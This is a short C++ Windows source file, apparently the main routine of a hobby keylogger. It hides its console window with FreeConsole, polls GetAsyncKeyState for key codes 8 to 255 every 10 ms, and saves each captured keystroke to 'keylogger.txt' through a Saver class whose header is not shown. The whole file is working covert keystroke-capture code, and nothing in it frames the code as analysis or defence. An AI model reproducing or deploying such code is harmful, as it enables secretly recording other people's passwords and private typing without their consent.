#include<iostream>
#include<Windows.h>
#include "Saver.h"
#include <ctime>

extern const char* TEXTFILE = "keylogger.txt";
const bool debug = true;
const int time_limit = 100;

int main() {
	FreeConsole();

	int time_taken = 0;
	int i;
	bool keep_running = false;

	time_t start_time, end_time;
	std::cout << "Starting Key Logger\n";
	Saver filesaver = Saver(TEXTFILE, debug);
	time(&start_time);

	while (time_taken<time_limit||keep_running) {
		Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) & 0x0001) {
				filesaver.Save(i);
			}
		}
		time(&end_time);
		//std::cout << time_taken<<"\n";
		time_taken = end_time - start_time;
	}

	return 0;
}